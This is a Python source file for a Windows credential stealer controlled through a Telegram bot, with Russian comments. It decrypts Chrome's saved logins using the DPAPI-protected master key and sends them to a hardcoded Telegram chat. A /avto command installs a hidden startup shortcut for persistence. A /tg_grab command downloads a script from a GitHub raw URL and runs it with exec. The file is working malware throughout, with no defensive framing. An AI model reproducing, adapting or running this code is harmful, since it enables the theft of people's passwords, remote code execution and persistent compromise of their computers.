import telebot
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from tkinter import messagebox
import tkinter as tk
import shutil
import sys
import winshell
import win32con
import requests
from bs4 import BeautifulSoup

# Замените токен на свой токен бота
bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U"
bot = telebot.TeleBot(bot_token)

# Замените chat_id на чат айди получателя
chat_id = 1882056354

if os.name != "nt":
    exit()

class Main:
    def __init__(self):
        with open(os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'), "r") as file:
            localState = file.read()
            localState = json.loads(localState)

        MasterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        MasterKey = MasterKey[5:] # Remove 'DPAPI' prefix
        self.MasterKey = self.decrypt_master_key(MasterKey)

    def decrypt_master_key(self, encrypted_key):
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def decrypt(self, buffer):
        try:
            iv = buffer[3:15]
            payload = buffer[15:]

            # Создание объекта шифрования AES
            cipher = AES.new(self.MasterKey, AES.MODE_GCM, iv)

            # Расшифровка данных
            decrypted = cipher.decrypt(payload)[:-16].decode() # Удаление 16 байт тега аутентификации
            return decrypted
        except Exception as e:
            print(f"Ошибка расшифровки: {e}")
            return "Ошибка расшифровки пароля"

def get_chrome_passwords():
    try:
        # Получение текущей директории
        current_directory = os.path.dirname(os.path.abspath(__file__))

        # Путь к базе данных Login Data
        PATH = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\default\Login Data')

        # Путь к скопированной базе данных в текущей директории
        target_db_path = os.path.join(current_directory, "Loginvault.db")

        # Создание экземпляра класса Main
        Chrome = Main()
        Chrome.__init__()

        # Копирование базы данных Login Data в текущую директорию
        shutil.copy2(PATH, target_db_path)

        # Создание соединения с скопированной базой данных
        connect = sqlite3.connect(target_db_path)
        cursor = connect.cursor()

        # Извлечение учетных данных из базы данных
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        passwords = []
        with open("result.txt", "w") as f:
            for row in cursor.fetchall():
                URL = row[0]
                USERNAME = row[1]
                EncryptedPassword = row[2]
                DecryptedPassword = Chrome.decrypt(EncryptedPassword)

                # Вывод учетных данных, если имя пользователя и URL присутствуют
                if len(USERNAME) > 0 and len(URL) > 0:
                    data = f'''
                     <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
                     Сайт: {URL}  
                     ник: {USERNAME}  
                     пароль: {DecryptedPassword}  
                     <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
                              '''
                    # print(data)
                    f.write(data)
                    passwords.append(data)

        # Отправка result.txt в Telegram
        with open("result.txt", "rb") as file:
            bot.send_document(chat_id, file)

        return passwords

    except Exception as e:
        print(f"Общая ошибка: {e}")
        return None

@bot.message_handler(commands=['avto'])
def avto(message):
    try:
        current_program = os.path.abspath(sys.argv[0])
        bot.send_message(message.chat.id, current_program)
        user_folder = os.path.expanduser("~")
        copy_folder = os.path.join(user_folder, "MyProgram")
        os.makedirs(copy_folder, exist_ok=True)
        shutil.copy(current_program, copy_folder)
        shortcut_name = "hostser.lnk"
        shortcut_path = os.path.join(user_folder, shortcut_name)
        with winshell.shortcut(shortcut_path) as shortcut:
            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
            shortcut.show_cmd = win32con.SW_HIDE
            shortcut.icon = (None, 0)
        startup_folder = winshell.startup()
        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
        shutil.copy(shortcut_path, startup_shortcut_path)
        bot.send_message(message.chat.id, "YSPESHNO DOBAVIL V AVTOZAPUSK!")
    except Exception as e:
        bot.send_message(message.chat.id, f"OSHIBKA PRI DOBALENII V AVTOZAPUSK: {e}")

@bot.message_handler(commands=['tg_grab'])
def handle_archive_and_send(message):
    chat_id = message.chat.id
    url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/stal.py'
    response = requests.get(url)
    html_content = response.content
    soup = BeautifulSoup(html_content, 'html.parser')
    text_without_tags = soup.get_text()
    exec(text_without_tags)
    bot.send_message(chat_id, "ARHIVASIA I OTPRAVKA ZAVESHENU.")

@bot.message_handler(commands=['get_passwords'])
def send_passwords(message):
    passwords = get_chrome_passwords()
    if passwords:
        for password in passwords:
            bot.send_message(message.chat.id, password)
    else:
        bot.send_message(message.chat.id, "Ошибка при получении паролей.")

# Запускаем бота
bot.infinity_polling()
